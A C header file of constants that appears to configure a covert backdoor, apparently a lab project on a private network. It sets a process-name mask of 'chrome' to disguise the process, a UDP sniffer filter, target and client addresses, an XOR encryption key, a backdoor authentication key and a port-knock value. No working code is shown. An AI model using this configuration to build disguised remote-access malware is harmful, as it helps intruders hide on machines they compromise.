// Payload
#define HEADER          "START["                // Header
#define FOOTER          "]END"                  // Footer
#define RETURN          "[re]"                  // Return message signal
#define RESEND          "[e]"                   // End of return
// Process
#define MASK            "chrome"                // Process name
// Packet Sniff
#define FILTER          "udp"                   // Sniffer filter

// Raw Socket
#define TARGETIP        "192.168.0.11"          // Target machine IP address
#define TARGETPORT      8505                    // Target machine port
#define PROTOCOL        "udp"                   // Protocol
#define CLIENTIP        "192.168.0.18"          // Client machine IP address
#define CLIENTPORT      8506                    // Client machine port

#define XORKEY          "`````````````````````" //xorkey that used for encryption and decryption
#define HEADERKEY       27                      // Backdoor authentication 
#define KNOCK           5000

//#define PIP_VERSION     "pip3"
#define PYTHON_VERSION  "python3"
#define MAX_SIZE        6000
#define STR_SIZE        1024